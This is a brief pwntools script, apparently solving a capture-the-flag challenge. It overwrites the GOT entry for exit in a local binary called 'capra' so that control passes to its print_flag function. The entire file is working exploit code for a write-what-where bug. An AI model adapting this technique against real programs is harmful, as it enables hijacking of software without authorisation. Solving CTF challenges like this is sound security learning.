from pwn import *

context.binary = "./capra"
p = process()
elf = ELF(context.binary.path)

where_addr = elf.got["exit"]
print(where_addr)
what_addr = elf.symbols["print_flag"]
print(what_addr)

p.sendline(hex(where_addr).encode())
p.sendline(hex(what_addr).encode())
p.interactive()